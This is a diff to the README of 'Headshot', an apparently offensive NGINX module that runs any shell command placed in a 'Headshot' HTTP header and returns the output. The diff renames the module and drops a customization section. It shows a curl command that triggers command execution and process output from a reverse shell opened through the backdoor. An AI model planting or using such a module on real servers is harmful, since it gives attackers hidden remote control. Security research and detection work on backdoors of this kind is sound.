@@ -11,7 +11,7 @@ rpm -U nginx-1.12.2-2.el7.x86_64.rpm --nodeps --force
 
 
 ## Usage
-To use the Mad Header simply supply your command as a value to the `Headshot` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.
+To use the Headshot simply supply your command as a value to the `Headshot` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.
 
 ```
 [root@localhost Headshot]# curl localhost --header "Headshot: ls -la /tmp"
@@ -81,9 +81,6 @@ For those curious, if one were to setup a reverse shell from this exploit and a 
  17720 ?        S      0:00              \_ sh -c /bin/bash
  17721 ?        S      0:00                  \_ /bin/bash
 ```
-
-## Customization
-For customization the NGINX directive can be changed by altering the directive string in the `ngx_http_headshot_commands` struct in `ngx_http_headshot_module.c` (it is currently set to `headshot`).
 
 ## Resources
 [The foremost resource on NGINX Modules](https://www.evanmiller.org/nginx-modules-guide.html)
